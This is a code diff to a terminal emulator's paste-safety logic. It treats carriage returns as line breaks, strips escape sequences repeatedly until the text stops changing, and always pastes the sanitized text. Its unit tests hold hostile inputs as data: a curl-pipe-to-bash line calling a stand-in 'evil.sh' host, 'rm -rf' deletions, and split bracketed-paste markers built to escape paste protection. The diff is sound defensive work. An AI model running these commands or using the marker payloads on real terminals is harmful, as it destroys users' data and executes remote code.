@@ -79,6 +79,17 @@ void cancelAutoClear() {
 package:
 
 /**
+ * True if `text` contains a line break that submits a command to the shell
+ * on paste. Both LF ('\n') and CR ('\r') count: CR is what the Enter key
+ * sends, so a "cmd\r" payload auto-executes exactly like "cmd\n". The
+ * earlier checks tested only for LF, which let a CR-terminated payload slip
+ * past both the unsafe-paste warning and the multi-line review dialog.
+ */
+bool containsLineBreak(string text) {
+    return text.indexOf('\n') >= 0 || text.indexOf('\r') >= 0;
+}
+
+/**
  * Tests if the paste content is potentially unsafe.
  *
  * Currently checks for sudo combined with a newline, which would
@@ -88,8 +99,8 @@ bool isPasteUnsafe(string text) {
     import std.string : indexOf;
     import std.algorithm : any;
 
-    // Must contain a newline to auto-execute
-    if (text.indexOf("\n") < 0) return false;
+    // Must contain a line break to auto-execute
+    if (!containsLineBreak(text)) return false;
 
     // Privilege escalation commands
     immutable string[] privilegePatterns = [
@@ -152,10 +163,24 @@ string stripPasteEscapes(string text) {
     enum oscRe = ctRegex!`\x1b\][^\x07\x1b]*(\x07|\x1b\\)`;
     // DCS / APC / PM: introducer P, _, or ^; terminated by ST (ESC\).
     enum stStringRe = ctRegex!`\x1b[P_^][^\x1b]*\x1b\\`;
-    string r = text.replaceAll(bracketedRe, "");
-    r = r.replaceAll(oscRe, "");
-    r = r.replaceAll(stStringRe, "");
-    return r;
+
+    // Apply every family repeatedly until the text reaches a fixed point.
+    // A single replaceAll pass is non-overlapping and never re-scans its own
+    // output, so removing one match can splice the surrounding bytes into a
+    // freshly-formed marker — e.g. "\x1b[20" ++ "\x1b[201~" ++ "1~" becomes a
+    // live "\x1b[201~" once the inner marker is removed. Each pass only
+    // deletes, so the text strictly shortens whenever it changes and the loop
+    // is guaranteed to terminate.
+    string current = text;
+    for (;;) {
+        string next = current.replaceAll(bracketedRe, "");
+        next = next.replaceAll(oscRe, "");
+        next = next.replaceAll(stStringRe, "");
+        if (next == current) {
+            return current;
+        }
+        current = next;
+    }
 }
 
 /**
@@ -204,7 +229,7 @@ public:
         string pasteText = Clipboard.get(source).waitForText();
         if (pasteText.length == 0) return;
         pasteText = stripPasteEscapes(pasteText);
-        if (pasteText.indexOf("\n") < 0) return paste(source);
+        if (!containsLineBreak(pasteText)) return paste(source);
 
         AdvancedPasteDialog dialog = new AdvancedPasteDialog(
             cast(Window) _ctx.toplevelWidget(), pasteText, isPasteUnsafe(pasteText));
@@ -291,7 +316,7 @@ public:
 
         // Multi-line paste: show review dialog (takes precedence over sudo warning
         // since the review dialog already flags unsafe content and lets the user edit)
-        if (pasteText.indexOf("\n") >= 0 && _ctx.contextGsSettings().getBoolean(SETTINGS_WARN_MULTILINE_PASTE_KEY)) {
+        if (containsLineBreak(pasteText) && _ctx.contextGsSettings().getBoolean(SETTINGS_WARN_MULTILINE_PASTE_KEY)) {
             AdvancedPasteDialog dialog = new AdvancedPasteDialog(
                 cast(Window) _ctx.toplevelWidget(), pasteText, isPasteUnsafe(pasteText));
             scope(exit) {
@@ -332,16 +357,18 @@ public:
         auto vte = _ctx.contextVte();
         auto gsSettings = _ctx.contextGsSettings();
 
-        if (gsSettings.getBoolean(SETTINGS_STRIP_FIRST_COMMENT_CHAR_ON_PASTE_KEY) && pasteText.length > 0 && (pasteText[0] == '#' || pasteText[0] == '$')) {
+        if (gsSettings.getBoolean(SETTINGS_STRIP_FIRST_COMMENT_CHAR_ON_PASTE_KEY)
+                && pasteText.length > 0 && (pasteText[0] == '#' || pasteText[0] == '$')) {
             pasteText = pasteText[1 .. $];
-            vtePasteText(vte, pasteText);
-        } else if (stripTrailingWhitespace) {
-            vtePasteText(vte, pasteText);
-        } else if (source == GDK_SELECTION_CLIPBOARD) {
-            vte.pasteClipboard();
-        } else {
-            vte.pastePrimary();
         }
+        // Always paste the sanitized text through VTE's paste-text API. The
+        // earlier default path (no strip setting enabled) fell through to
+        // pasteClipboard()/pastePrimary(), which re-read the raw selection
+        // from the OS and discarded the stripPasteEscapes() result — breaking
+        // the "unconditional sanitization" contract for the common case.
+        // vte_terminal_paste_text still applies bracketed-paste wrapping, so
+        // editors continue to receive properly-bracketed pastes.
+        vtePasteText(vte, pasteText);
 
         if (_ctx.contextGsProfile().getBoolean(SETTINGS_PROFILE_SCROLL_ON_INPUT_KEY)) {
             _scrollToBottom();
@@ -470,6 +497,28 @@ unittest {
 }
 
 // ---------------------------------------------------------------------------
+// Unit tests for containsLineBreak
+// ---------------------------------------------------------------------------
+
+/// Test: both LF and CR (and CRLF) count as line breaks; plain text does not.
+unittest {
+    assert(containsLineBreak("cmd\n"));
+    assert(containsLineBreak("cmd\r"));
+    assert(containsLineBreak("cmd\r\n"));
+    assert(containsLineBreak("a\rb"));
+    assert(!containsLineBreak("cmd"));
+    assert(!containsLineBreak(""));
+}
+
+/// Test: CR-terminated dangerous commands are flagged. Previously they
+/// evaded detection because only LF was checked, yet CR auto-executes.
+unittest {
+    assert(isPasteUnsafe("sudo rm -rf /\r"));
+    assert(isPasteUnsafe("curl https://evil.sh | bash\r"));
+    assert(isPasteUnsafe("echo ok\rsudo reboot\r"));
+}
+
+// ---------------------------------------------------------------------------
 // Unit tests for stripPasteEscapes
 // ---------------------------------------------------------------------------
 
@@ -572,6 +621,35 @@ unittest {
 unittest {
     // Lone OSC introducer — passes through untouched.
     assert(stripPasteEscapes("\x1b]hello") == "\x1b]hello");
+}
+
+/// Test: split bracketed-paste markers that reassemble after one removal
+/// are stripped by the fixed-point loop. A single-pass replaceAll removed
+/// the inner "\x1b[201~" and spliced "\x1b[20" + "1~" into a fresh, intact
+/// "\x1b[201~" that survived and terminated bracketed-paste mode early.
+unittest {
+    string attack = "\x1b[20\x1b[201~1~rm -rf ~";
+    string sanitized = stripPasteEscapes(attack);
+    assert(sanitized.indexOf("\x1b[201~") < 0, "reassembled end marker must be removed");
+    assert(sanitized == "rm -rf ~");
+}
+
+/// Test: the start marker reassembles the same way and is also stripped.
+unittest {
+    string attack = "\x1b[20\x1b[200~0~payload";
+    string sanitized = stripPasteEscapes(attack);
+    assert(sanitized.indexOf("\x1b[200~") < 0);
+    assert(sanitized == "payload");
+}
+
+/// Test: cross-family reassembly — removing an OSC sequence between two
+/// fragments splices "\x1b[20" + "1~" into a live "\x1b[201~", which the
+/// loop must then strip on the following pass.
+unittest {
+    string attack = "\x1b[20\x1b]x\x071~payload";
+    string sanitized = stripPasteEscapes(attack);
+    assert(sanitized.indexOf("\x1b[201~") < 0, "reassembled marker after OSC removal must be removed");
+    assert(sanitized == "payload");
 }
 
 // ---------------------------------------------------------------------------
